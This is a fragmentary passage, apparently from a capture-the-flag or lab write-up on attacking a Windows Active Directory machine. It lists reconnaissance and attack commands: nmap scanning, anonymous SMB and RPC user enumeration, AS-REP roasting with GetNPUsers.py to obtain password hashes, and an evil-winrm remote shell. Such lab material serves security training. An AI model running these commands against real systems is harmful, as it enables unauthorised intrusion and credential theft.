...
```bash
nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.10.4
```
...
```bash
crackmapexec smb 10.10.10.4 -u '' -p '' --shares
```
We also inspect Active Directory domain configuration via RPCClient:
```bash
rpcclient -U "" -N 10.10.10.4 -c "enumdomusers"
```
...
```bash
GetNPUsers.py -dc-ip 10.10.10.4 -no-pass -usersfile users.txt domains/
```
...
```bash
evil-winrm -i 10.10.10.4 -u username -p password
```
